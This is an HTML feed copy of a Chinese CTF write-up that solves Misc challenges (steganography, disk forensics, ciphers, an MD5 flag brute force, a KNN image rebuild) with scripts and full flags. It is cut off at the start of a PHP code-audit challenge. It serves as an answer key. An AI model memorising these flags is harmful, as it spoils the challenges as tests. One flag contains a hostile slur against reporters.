        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="拼图v2-0"><a href="#拼图v2-0" class="headerlink" title="拼图v2.0"></a>拼图v2.0</h3><p>朴实无华的拼图，唯一不同的是 <code>favicon.png</code> 提供了原图，同时因为图片需要旋转，所以 gaps 行不通了。</p><p>这里首先使用 Chrome 插件 Resources Saver 下载所有的图片，然后写脚本拼图。因为原图已经给出，所以将原图按照题目的方式切片即得到了拼图的模板。剩下要做的就是将拼图与原图的切片一一对应然后拼合。这里采用了采样的办法，每个切片取九个采样点，然后根据其匹配的顺序将切片进行旋转，全部完成之后拼合即得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952302386.1dfaa2254361bab1b618da7f3c0b0406c124fd20.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NinePointSamplingAnalyze</span>(<span class="params">image</span>):</span></span><br><span class="line">    width, height = image.size</span><br><span class="line">    imgObject = image.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    pixels = imgObject.load()</span><br><span class="line">    samplings = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            samplePixel = pixels[(width - <span class="number">1</span>) <span class="keyword">if</span> j == <span class="number">2</span> <span class="keyword">else</span> (width // <span class="number">2</span>) * j, (height - <span class="number">1</span>) <span class="keyword">if</span> i == <span class="number">2</span> <span class="keyword">else</span> (height // <span class="number">2</span>) * i]</span><br><span class="line">            samplings.append(samplePixel)</span><br><span class="line">    image.close()</span><br><span class="line">    <span class="keyword">return</span> samplings</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingMatch</span>(<span class="params">modelSample, sample</span>):</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> sample[i] == modelSample[<span class="string">&quot;sample&quot;</span>][i]:</span><br><span class="line">            flag += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingBestRotate</span>(<span class="params">modelSample, sample</span>):</span></span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        flags.append(SamplingMatch(modelSample, sample))</span><br><span class="line">        sample = SamplingRotate(sample)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(flags), flags.index(<span class="built_in">max</span>(flags)) * (-<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingRotate</span>(<span class="params">sample</span>):</span></span><br><span class="line">    newSamplings = []</span><br><span class="line">    index = [<span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        newSamplings.append(sample[index[i]])</span><br><span class="line">    <span class="keyword">return</span> newSamplings</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingBestSolve</span>(<span class="params">modelSamplings, sample</span>):</span></span><br><span class="line">    flags = []</span><br><span class="line">    degrees = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(modelSamplings)):</span><br><span class="line">        flag, degree = SamplingBestRotate(modelSamplings[i], sample)</span><br><span class="line">        flags.append(flag)</span><br><span class="line">        degrees.append(degree)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(flags), flags.index(<span class="built_in">max</span>(flags)), degrees[flags.index(<span class="built_in">max</span>(flags))]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f4864ce0-18d6-4e45-bb51-08a9d47de97f&#125;</span><br></pre></td></tr></table></figure><h3 id="AA86"><a href="#AA86" class="headerlink" title="AA86"></a>AA86</h3><p>根据题目描述 <code>大约在16位操作系统还能跑的年代</code>，搜索可以找到如下信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952493829.5803876425520d5e7f0bb982c747f05dc16e9ac4.png"></p><p>于是掏出学汇编的时候用的 DOSBOX 执行一波，得到了 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952601784.ce893e0360300e9b38e496410b13fc737758eb0a.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;https:&#x2F;&#x2F;utf-8.jp&#x2F;public&#x2F;sas&#x2F;index.html&#125;</span><br></pre></td></tr></table></figure><h3 id="碑寺六十四卦"><a href="#碑寺六十四卦" class="headerlink" title="碑寺六十四卦"></a>碑寺六十四卦</h3><p>将图片反色后用 stegsolve 解出 LSB 隐写，得到一张 PNG。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952736592.6c6ba2167f1c48bf3c66756d2fef8db6959dde13.png"></p><p>将文件头处理好后打开，得到一张与碑上的卦对应的图。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13085261981/0" style="zoom:200%;" /><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952884823.8035a6eb7b74b33372f158cf7a070bd924c2b4fc.png" alt="image-20210125233544602"></p><p>然后将图上每一个对应八卦图和六十四卦速查得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">晋 噬嗑 井 复 谦 丰</span><br><span class="line">渐 大过 睽 巽 无妄 屯</span><br><span class="line">中孚 观 归妹 革 坎 颐 </span><br><span class="line">革 明夷 否 泰 明夷</span><br></pre></td></tr></table></figure><p>按照图上的数字解出即为 <code>5 37 26 32 8 44 11 30 53 27 39 34 51 3 52 46 18 33 46 40 7 56 40</code>，将其对应 Base64 编码表解出 <code>FlagIsLe1bnizD0uShuoH4o</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Le1bnizD0uShuoH4o&#125;</span><br></pre></td></tr></table></figure><h3 id="牛年大吉"><a href="#牛年大吉" class="headerlink" title="牛年大吉"></a>牛年大吉</h3><p>vhd 文件，挂载发现提示格式化，于是打开 WinHex 读取。发现引导扇区被擦除了，同时有 <code>？lag.7z</code> 和 <code>牛年大吉.jpg</code> 两个文件。根据提示<strong>压缩包密码在图片文件头里</strong>可知密码为 <code>89504E47</code>，解压可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTFshow_The_Year_of_the_Ox&#125;</span><br></pre></td></tr></table></figure><h3 id="请问大吉杯的签到是在这里签吗"><a href="#请问大吉杯的签到是在这里签吗" class="headerlink" title="请问大吉杯的签到是在这里签吗"></a>请问大吉杯的签到是在这里签吗</h3><p>将图片套娃 foremost 之后得到四张二维码，扫出来如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 请问DJB CTF比赛的签到处在什么地方？</span><br><span class="line">- 好像没有岔路了，一直往前走试试看</span><br><span class="line">- 好像没有岔路了，一直往前走试试看</span><br><span class="line">- 咦，这是死胡同，是不是哪里走错路了</span><br></pre></td></tr></table></figure><p>于是回到第二张，尝试使用 StegSolve 看隐写，得到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952987987.fee470d1bab9c4d741ec29d85e535744abe99c2f.png"></p><p>根据猪圈密码解密表，解得内容为 <code>FLAGDAJIADOAIDJB</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953098088.81d335b53e7d297a990c76c516939324fc3e8cb6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dajiadoaidjb&#125;</span><br></pre></td></tr></table></figure><h3 id="十八般兵器"><a href="#十八般兵器" class="headerlink" title="十八般兵器"></a>十八般兵器</h3><p>使用压缩文档备注<strong>2021牛年大吉</strong>解压后得到一个文本文档和十八张兵器的图。图是 jpg 的 JPHS 隐写，分别提取出来之后发现每段文本后面有几个数字，将其按照文本文档中兵器的顺序 <code>刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙</code> 分类拼接，得到如下两端。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">136143999223163525817639797858700963935</span><br><span class="line">3044053720460556276610613346353724230575</span><br></pre></td></tr></table></figure><p>分别使用十进制转十六进制和八进制转十六进制处理后拼接。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b43544673686f775f31305f62415f42616e5f62316e675f51317d</span><br></pre></td></tr></table></figure><p><code>From Hex</code> 解得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTFshow_10_bA_Ban_b1ng_Q1&#125;</span><br></pre></td></tr></table></figure><h3 id="色图生成器"><a href="#色图生成器" class="headerlink" title="色图生成器"></a>色图生成器</h3><p>解压文件后可得到一张图片和一个写满颜色的文本文档。将图片处理一下，只留下有小长方块的部分。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953294592.24e5192096fb763e44b6aa8ca8eb912b8ff6d3a7.png"></p><p>然后将其中的像素值读出来，每个小长方块记录一次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;extracted.png&quot;</span>).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line"></span><br><span class="line">extractedFile = <span class="built_in">open</span>(<span class="string">&quot;extracted.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">width, height = image.size</span><br><span class="line">widthPiece = width // <span class="number">5</span></span><br><span class="line">heightPiece = height // <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(heightPiece):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(widthPiece):</span><br><span class="line">        pixel = image.getpixel((<span class="number">5</span> * y, <span class="number">20</span> * x))</span><br><span class="line">        colorByte = <span class="built_in">str</span>((pixel[<span class="number">0</span>] <span class="keyword">if</span> pixel[<span class="number">0</span>] != <span class="number">0</span> <span class="keyword">else</span> pixel[<span class="number">1</span>] <span class="keyword">if</span> pixel[<span class="number">1</span>] != <span class="number">0</span> <span class="keyword">else</span> pixel[<span class="number">2</span>]))</span><br><span class="line">        extractedFile.write(<span class="string">&quot;&#123;&#125; &quot;</span>.<span class="built_in">format</span>(colorByte))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Written &#123;&#125;&quot;</span>.<span class="built_in">format</span>(colorByte))</span><br><span class="line">extractedFile.close()</span><br></pre></td></tr></table></figure><p>将所得的内容经过 <code>From Decimal</code> 解码之后可以得到一个 rar 压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953416088.31f8de779dbf7196256d60d05abc4c30f69804f2.png"></p><p>将 rar 压缩文档解压可得一张图片。010 editor 打开图片可发现文件尾部有 zip 压缩文档，将其提取出来。使用 Cloakify 的解密工具，第一步得到的文本文档的内容作为 key 解密 rar 压缩文档的注释内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953514193.7be4f251830ddd0db58917b2ec371e2be6a1e7e3.png"></p><p>得到提取出来的 zip 压缩包的密码 <code>D3arD4La0P1e45eD4iDa1Wo</code>。解压提取出来的 zip 压缩文档之后可以得到一个 .pyc 文件。将其使用<a href="http://tools.bugscaner.com/decompyle/">在线反编译工具</a>反编译之后可以得到如下代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Compiled at: 1969-12-31 18:00:00</span></span><br><span class="line"><span class="comment">#Powered by BugScaner</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re, hashlib, random</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;jiu_bu_gao_su_ni&#125;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> re.fullmatch(<span class="string">&#x27;^flag&#123;[A-Z][0-9a-zA-Z]&#123;4&#125;&#125;$&#x27;</span>, flag):</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(flag.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    m = m.hexdigest()</span><br><span class="line">    col = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>):</span><br><span class="line">        tmp = <span class="built_in">int</span>(m[i:i + <span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        tmp += random.randint(-<span class="number">5</span>, <span class="number">5</span>)</span><br><span class="line">        col += [tmp]</span><br><span class="line"></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">1024</span>, <span class="number">512</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        timg = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">256</span>, <span class="number">512</span>), <span class="built_in">tuple</span>(col[i * <span class="number">3</span>:i * <span class="number">3</span> + <span class="number">3</span>]))</span><br><span class="line">        img.paste(timg, (i * <span class="number">256</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    img.save(<span class="string">&#x27;C:/Users/Administrator/Desktop/setu.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>结合前面得到的图片可知 flag 的格式，尝试写脚本爆破 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953611917.e4a05c1c009b678edcb8b0c7ef39554151c066a1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">colors = [<span class="number">139</span>, <span class="number">102</span>, <span class="number">162</span>, <span class="number">24</span>, <span class="number">85</span>, <span class="number">57</span>, <span class="number">160</span>, <span class="number">37</span>, <span class="number">239</span>, <span class="number">200</span>, <span class="number">154</span>, <span class="number">30</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">                flag = <span class="string">&quot;flag&#123;D&quot;</span> + <span class="built_in">chr</span>(i) + <span class="built_in">chr</span>(j) + <span class="built_in">chr</span>(k) + <span class="built_in">chr</span>(n) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> re.fullmatch(<span class="string">&#x27;^flag&#123;[A-Z][0-9a-zA-Z]&#123;4&#125;&#125;$&#x27;</span>, flag):</span><br><span class="line">                    m = hashlib.md5()</span><br><span class="line">                    m.update(flag.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">                    m = m.hexdigest()</span><br><span class="line">                    runCount = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>):</span><br><span class="line">                        color = colors[runCount]</span><br><span class="line">                        tmp = <span class="built_in">int</span>(m[x:x + <span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">                        <span class="keyword">if</span> -<span class="number">5</span> &lt; (tmp - color) &lt; <span class="number">5</span>:</span><br><span class="line">                            runCount += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">elif</span> x == <span class="number">22</span>:  <span class="comment"># 23 - 1</span></span><br><span class="line">                            <span class="built_in">print</span>(flag)</span><br><span class="line">                            exit(<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>运行脚本可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;D4n1U&#125;</span><br></pre></td></tr></table></figure><h3 id="童话镇"><a href="#童话镇" class="headerlink" title="童话镇"></a>童话镇</h3><p>将文件分离解压之后得到训练集和 flag，从网上找了一段 KNN 的算法稍微修改一下即可算出 flag 的标签。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##给出训练数据以及对应的类别</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createDataSet</span>():</span></span><br><span class="line">    groups = []</span><br><span class="line">    labels = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;t.txt&quot;</span>):</span><br><span class="line">        group = []</span><br><span class="line">        label = line[<span class="number">0</span>]</span><br><span class="line">        line = line[<span class="number">2</span>:]</span><br><span class="line">        line = line.lstrip(<span class="string">&quot;[&quot;</span>).rstrip(<span class="string">&quot;]\n&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> line:</span><br><span class="line">            group.append(<span class="built_in">int</span>(x))</span><br><span class="line">        groups.append(group)</span><br><span class="line">        labels.append(label)</span><br><span class="line">    <span class="built_in">print</span>(groups)</span><br><span class="line">    <span class="keyword">return</span> array(groups), labels</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###通过KNN进行分类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classify</span>(<span class="params"><span class="built_in">input</span>, dataSet, label, k</span>):</span></span><br><span class="line">    dataSize = dataSet.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">####计算欧式距离</span></span><br><span class="line">    diff = tile(<span class="built_in">input</span>, (dataSize, <span class="number">1</span>)) - dataSet</span><br><span class="line">    sqdiff = diff ** <span class="number">2</span></span><br><span class="line">    squareDist = <span class="built_in">sum</span>(sqdiff, axis=<span class="number">1</span>)  <span class="comment">###行向量分别相加，从而得到新的一个行向量</span></span><br><span class="line">    dist = squareDist ** <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">##对距离进行排序</span></span><br><span class="line">    sortedDistIndex = argsort(dist)  <span class="comment">##argsort()根据元素的值从大到小对元素进行排序，返回下标</span></span><br><span class="line"></span><br><span class="line">    classCount = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        voteLabel = label[sortedDistIndex[i]]</span><br><span class="line">        <span class="comment">###对选取的K个样本所属的类别个数进行统计</span></span><br><span class="line">        classCount[voteLabel] = classCount.get(voteLabel, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">    <span class="comment">###选取出现的类别次数最多的类别</span></span><br><span class="line">    maxCount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> classCount.items():</span><br><span class="line">        <span class="keyword">if</span> value &gt; maxCount:</span><br><span class="line">            maxCount = value</span><br><span class="line">            classes = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> classes</span><br><span class="line"></span><br><span class="line">dataSet, labels = createDataSet()</span><br><span class="line">inputs = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>):</span><br><span class="line">    <span class="built_in">input</span> = []</span><br><span class="line">    line = line.lstrip(<span class="string">&quot;[&quot;</span>).rstrip(<span class="string">&quot;]\n&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> line:</span><br><span class="line">        <span class="built_in">input</span>.append(<span class="built_in">int</span>(x))</span><br><span class="line">    inputs.append(<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;KNNresulta.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">input</span> <span class="keyword">in</span> inputs:</span><br><span class="line">    output = classify(array(<span class="built_in">input</span>), dataSet, labels, <span class="number">2</span>)</span><br><span class="line">    file.write(output)</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>通过标签数量可以确定图片的尺寸，写脚本求出标签数量的约数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">78289</span> // <span class="number">2</span> + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">78289</span> % x == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found number &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br></pre></td></tr></table></figure><p>很容易得出图片尺寸为 79x991。将标签转换为像素从而构建图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flagFile = <span class="built_in">open</span>(<span class="string">&quot;KNNresulta.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flagStream = flagFile.read().rstrip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">79</span>, <span class="number">991</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">79</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">991</span>):</span><br><span class="line">        pixel = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">if</span> <span class="built_in">int</span>(flagStream[i * <span class="number">991</span> + j]) <span class="keyword">else</span> (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        image.putpixel((i, j), pixel)</span><br><span class="line">image = image.transpose(Image.FLIP_TOP_BOTTOM)</span><br><span class="line">image.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>将得到的图片顺时针旋转 90° 可得到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953764336.e361a2af8783d278d28d24e5e87083c0406244c2.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;67373永生_举报狗必须死&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><p>代码审计题目，给出的源代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 